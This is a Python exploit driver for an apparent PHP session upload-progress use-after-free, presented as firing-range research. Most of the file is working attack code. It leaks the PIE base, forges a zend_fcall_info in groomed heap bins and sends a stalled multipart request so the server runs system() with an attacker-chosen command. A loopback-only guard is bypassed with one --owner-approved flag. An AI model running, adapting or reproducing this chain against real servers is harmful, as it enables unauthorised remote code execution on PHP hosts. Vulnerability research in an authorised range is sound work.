#!/usr/bin/env python3
"""php2shell-bastet.py - range-native exploit research driver for
CVE-2026-109618/619 (PHP session.upload_progress stale-pointer chain).

RULES OF ENGAGEMENT (hard):
  * 127.0.0.1/loopback targets ONLY unless --owner-approved is passed,
    reserved for Dean's authorised safe-harbour engagements.
  * Exists to exercise OUR firing range (patch-reverted php-src images,
    canary scoring). A capture only counts when scripts/score.sh verifies
    an execution-derived FLAG{...}.

Hardening lineage (research/shared/findings.md "live-fire verdict"):
  1. LEAK-FIRST: forge nothing until the runtime leak stage yields the PIE
     load bias; call target = bias + nm(symbol) offset. No shipped
     constants (jackalsyn's hardcoded --call was exactly our no-crash
     ambiguity).
  2. PROFILE REGISTRY: groom + forge offsets keyed per (arch, build, sapi).
     x86-64 layout must NOT be applied to aarch64 - exact-profile match is
     a hard gate; aarch64 needs pahole-derived structs first.
  3. ADAPTIVE RETRY ENVELOPE: N attempts with sid rotation and groom-count
     jitter; a miss on an untuned build is expected, not fatal.
  4. BLIND CHANNEL: in-band stdout AND file-drop + verify-fetch fallback.
  5. TIMELINE: every stage timestamped; stall-phase misses localise tuning
     failures fastest.

Mechanism (public since php-up-2026 + corroborated by our own source audit):
  multipart POST with PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS fields;
  FILLUNIT(5120) stall keeps the progress bucket alive across two
  php_session_rfc1867_update() calls; the second update dtors the previous
  progress tree (HashTable.pDestructor = zval_ptr_dtor); packed t[] array
  reclaims the freed 320-byte bins with a forged zend_fcall_info; the stale
  FILE_DATA store then invokes the forged handler -> system(cmd).
"""
from __future__ import annotations

import argparse
import ipaddress
import json
import os
import secrets
import socket
import struct
import sys
import time
import urllib.request
from urllib.parse import urlparse

BOUNDARY = b"K9bastetPoC"
ORACLE_MARK = "BASTET_PWNED_MARK"

BANNER = r"""
      \ /
     ( * )
      \|/
 /\___/\  |
(  o o  ) |          php2shell-bastet
(  =^=  ) |          range-native CVE-2026-10961x driver
 (  "  )  |          the canary sings only for the cat
____/\_____/__|__    who earns FLAG{...}
"""

# ---------------------------------------------------------------- profiles --
# FILL=5120 is FILLUNIT (main/rfc1867.c). Groom bin size 320 = align(24+288+1)
# matches the progress HashTable (nTableSize 8 => HT 320). Forge offsets are
# x86-64 gcc struct packing for zend_fcall_info / zend_internal_function.
PROFILES = {
    "x86_64-php8x": {
        "arch": "x86_64", "fill": 5120, "n_groom": 149, "blob": 288,
        "fci_size": 64, "off_fn": 8, "off_type": 16, "off_params": 32,
        "off_param_count": 48,
        "off_internal_flag": 64, "off_handler": 64 + 72,
        "zend_internal": 1, "is_string": 0x106, "is_object": 0x308,
        "off_cmd": 200, "cmd_room": 80,
    },
    # Derived from THIS build's headers via offsetof probe (see
    # scripts/derive_offsets.py): FCI{size@0 fn.val@8 type@16 params@32
    # param_count@48, size 64}; zend_internal_function{type@0 handler@72,
    # size 136}. Handler delta is 72 on aarch64 vs 88 on x86 - this is the
    # porting trap the leaked x86 profile would have walked straight into.
    # Bin-groom count (149) stays empirical per allocator build: jitter
    # sweep handles it; FILL=5120 is arch-independent (FILLUNIT).
    "aarch64-php8x": {
        "arch": "aarch64", "fill": 5120, "n_groom": 149, "blob": 288,
        "fci_size": 64, "off_fn": 8, "off_type": 16, "off_params": 32,
        "off_param_count": 48,
        "if_base": 64, "off_internal_flag": 64 + 0, "off_handler": 64 + 72,
        "zend_internal": 1, "is_string": 0x106, "is_object": 0x308,
        "off_cmd": 200, "cmd_room": 80,
    },
}


def log(stage: str, msg: str, t0: float) -> None:
    print(f"[{time.time() - t0:6.1f}s] {stage:9s} {msg}", flush=True)


# ------------------------------------------------------------------- leak --
def leak_bias(leak_url: str, t0: float) -> int:
    """Full fingerprint leak via lab oracle (?probe=all): arch, php version,
    SAPI, module biases, heap span. Hard-gates the profile against reality -
    no x86 offsets ever touch an aarch64 child again. Returns bias."""
    req = urllib.request.Request(leak_url + "?probe=all",
                                 headers={"User-Agent": "p2s-bastet"})
    with urllib.request.urlopen(req, timeout=15) as r:
        fp = json.load(r)
    import platform
    host_arch = platform.machine()
    if fp.get("arch") != host_arch:
        print(f"!! fingerprint: target arch {fp.get('arch')} vs our tooling built "
              f"for {host_arch}: profiles must match the TARGET arch", file=sys.stderr)
    log("LEAK", f"arch={fp.get('arch')} php={fp.get('php_version')} "
                f"sapi={fp.get('php_sapi')} alloc={fp.get('allocator')}", t0)
    bias = fp.get("bias")
    if bias is None:
        raise SystemExit("leak stage: no zend_call_function module in maps")
    log("LEAK", f"bias=0x{bias:x} heap=0x{(fp.get('heap') or [0,0])[0]:x}", t0)
    return bias


def resolve_call(syms_path: str, bias: int, t0: float) -> int:
    """Runtime VA of zend_call_function = nm file offset + leaked bias."""
    syms = json.load(open(syms_path))
    off = int(syms["zend_call_function"], 0)
    call = bias + off
    log("LEAK", f"zend_call_function=0x{call:x} (off 0x{off:x})", t0)
    return call


# ------------------------------------------------------------------ forge --
def forge(prof: dict, call: int, cmd: bytes) -> bytes:
    """One 320-bin payload doubling as reclaimed packed-array zval and as
    a forged zend_fcall_info whose handler pointer is the leaked target."""
    rec = bytearray(prof["blob"])
    struct.pack_into("<Q", rec, 0, prof["fci_size"])          # FCI.size
    struct.pack_into("<Q", rec, prof["off_fn"], call)          # function_name.value
    struct.pack_into("<I", rec, prof["off_type"], prof["is_string"])
    struct.pack_into("<I", rec, prof.get("off_param_count", prof["off_params"]), 1)
    rec[prof["off_internal_flag"]] = prof["zend_internal"]
    struct.pack_into("<Q", rec, prof["off_handler"], call)     # handler
    struct.pack_into("<I", rec, 160, prof["is_object"])
    sysb = (b"system\x00" + cmd + b"\x00")[: prof["cmd_room"]]
    rec[prof["off_cmd"]: prof["off_cmd"] + len(sysb)] = sysb
    return bytes(rec)


def build_body(prof: dict, sid: str, cmd: bytes, call: int,
               n_groom: int, progress_value: bytes = b"x") -> tuple[bytes, bytes]:
    """(phase1, tail): phase1 ends mid-stream at the stall point."""
    fill = prof["fill"]
    blob = forge(prof, call, cmd)
    if BOUNDARY in blob or b"\r\n--" + BOUNDARY in blob:
        raise SystemExit("boundary collided with forged blob; rotate BOUNDARY")

    def part(name: bytes, body: bytes, filename: bytes | None = None) -> bytes:
        disp = b'Content-Disposition: form-data; name="' + name + b'"'
        if filename is not None:
            disp += b'; filename="' + filename + b'"'
        return b"--" + BOUNDARY + b"\r\n" + disp + b"\r\n\r\n" + body

    pre = (part(b"PHPSESSID", sid.encode()) + b"\r\n"
           + part(b"PHP_SESSION_UPLOAD_PROGRESS", progress_value) + b"\r\n"
           + part(b"f", b"", filename=b"a") + b"\r\n")
    phase1 = pre + b"A" * (fill + 64)
    tail = b"B" * (fill + 64) + b"\r\n"
    for _ in range(n_groom):
        tail += part(b"t[]", blob) + b"\r\n"
    tail += part(b"g", b"C" * 64, filename=b"b") + b"\r\n"
    tail += b"--" + BOUNDARY + b"--\r\n"
    return phase1, tail


# --------------------------------------------------------------- deliver --
def deliver(url: str, phase1: bytes, tail: bytes, sid: str, stall: float,
            timeout: int = 40) -> bytes:
    """Plain-HTTP two-chunk delivery. (No TLS relay: the range speaks HTTP on
    loopback; the leaked tool's https relay was a workaround for its own
    hardcoded TLS requirement.)"""
    u = urlparse(url)
    host, port, path = u.hostname, u.port or 80, u.path or "/"
    if u.query:
        path += "?" + u.query
    body_len = len(phase1) + len(tail)
    head = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
            f"User-Agent: p2s-bastet\r\nCookie: PHPSESSID={sid}\r\n"
            f"Content-Type: multipart/form-data; boundary={BOUNDARY.decode()}\r\n"
            f"Content-Length: {body_len}\r\nConnection: close\r\n\r\n").encode()
    s = socket.create_connection((host, port), timeout=timeout)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.sendall(head + phase1)
    if stall:
        time.sleep(stall)   # > upload_progress.min_freq(1s): second update dtors
    s.sendall(tail)
    s.settimeout(timeout)
    chunks = []
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        chunks.append(d)
    s.close()
    return b"".join(chunks)


def verify_blind(verify_url: str) -> bool:
    try:
        with urllib.request.urlopen(verify_url, timeout=10) as r:
            return ORACLE_MARK in r.read().decode(errors="replace")
    except Exception:
        return False


# ---------------------------------------------------------------- safety --
def guard_target(url: str, owner_approved: bool) -> None:
    if owner_approved:
        print("!! --owner-approved set: scope discipline belongs to Dean",
              file=sys.stderr, flush=True)
        return
    host = urlparse(url).hostname or ""
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        if host not in ("localhost", "ip6-localhost"):
            raise SystemExit(f"target {host!r} is not loopback; refusing "
                             "(range-only; Dean's authorised engagements "
                             "require --owner-approved)")
        return
    if not ip.is_loopback:
        raise SystemExit(f"target {ip} is not loopback; refusing (range-only)")


# ------------------------------------------------------------------- main --
def main() -> int:
    ap = argparse.ArgumentParser(description="php2shell-bastet (firing-range only)")
    ap.add_argument("target", help="http://127.0.0.1:PORT/lab.php")
    ap.add_argument("--command", default=f"id; echo {ORACLE_MARK}")
    ap.add_argument("--profile", default="x86_64-php8x")
    ap.add_argument("--syms", required=False,
                    help='JSON {"zend_call_function": "0xOFF"} from nm of the target binary')
    ap.add_argument("--bias", type=lambda x: int(x, 16), default=None,
                    help="leaked libphp base (for targets without the "
                         "lab oracle; leak-first applies - bias comes from "
                         "an in-band leak or the assisted range helper)")
    ap.add_argument("--leak-url", default="", help="lab oracle URL (default: target)")
    ap.add_argument("--attempts", type=int, default=8)
    ap.add_argument("--stall", type=float, default=1.4)
    ap.add_argument("--jitter", type=int, default=6,
                    help="groom-count sweep +/- N across attempts")
    ap.add_argument("--progress-len", type=int, default=0,
                    help="PHP_SESSION_UPLOAD_PROGRESS value size (OOM trigger; "
                         "e.g. 1048576 at 2M limit = vendor's FORMDATA-copy OOM)")
    ap.add_argument("--verify-url", default="", help="blind file-drop check URL")
    ap.add_argument("--out", default="", help="with --dry: write full body to file")
    ap.add_argument("--dry", action="store_true", help="build body only, never send")
    ap.add_argument("--owner-approved", action="store_true")
    a = ap.parse_args()

    guard_target(a.target, a.owner_approved)
    print(BANNER, flush=True)
    prof = PROFILES.get(a.profile)
    if not prof:
        raise SystemExit(f"profile {a.profile!r} unknown; aarch64 profiles "
                         "require pahole-derived offsets (findings.md gate)")
    t0 = time.time()
    cmd = a.command.encode()

    if a.dry:
        sid = "%032x" % secrets.randbits(128)
        p1, tl = build_body(prof, sid, cmd, 0x4141414141414141, prof["n_groom"])
        body = p1 + tl
        if a.out:
            open(a.out, "wb").write(body)
        print(f"dry: total={len(body)} phase1={len(p1)} "
              f"n_groom={prof['n_groom']} blob={prof['blob']}")
        return 0

    if not a.syms or not os.path.exists(a.syms):
        raise SystemExit("--syms JSON required: leak-first policy, no shipped "
                         "constants")

    for n in range(1, a.attempts + 1):
        log("ATTEMPT", f"{n}/{a.attempts}", t0)
        if a.bias is not None:
            bias = a.bias
            log("LEAK", f"bias=0x{bias:x} (provided via --bias)", t0)
        else:
            bias = leak_bias(a.leak_url or a.target.split("?")[0], t0)
        call = resolve_call(a.syms, bias, t0)
        off = (n % (2 * a.jitter + 1)) - a.jitter if a.jitter else 0
        n_groom = max(1, prof["n_groom"] + off)
        sid = "%032x" % secrets.randbits(128)
        pv = (b"V" * a.progress_len) if a.progress_len else b"x"
        phase1, tail = build_body(prof, sid, cmd, call, n_groom, progress_value=pv)
        log("STAGE", f"total={len(phase1) + len(tail)} n_groom={n_groom} "
                     f"call=0x{call:x}", t0)
        try:
            resp = deliver(a.target, phase1, tail, sid, a.stall)
        except Exception as e:
            log("DELIVER", f"{type(e).__name__}: {e}", t0)
            continue
        body = resp.split(b"\r\n\r\n", 1)[-1]
        hit = ORACLE_MARK.encode() in body or b"uid=" in body
        log("EXECUTE", f"resp={len(resp)}B inband={hit}", t0)
        if not hit and a.verify_url:
            hit = verify_blind(a.verify_url)
            log("VERIFY", f"blind={hit}", t0)
        if hit:
            log("CHAIN", "COMPLETE", t0)
            print(body[:400].decode(errors="replace"))
            return 0
    log("CHAIN", "FAILED - retune profile; see findings.md groom notes", t0)
    return 1


if __name__ == "__main__":
    sys.exit(main())
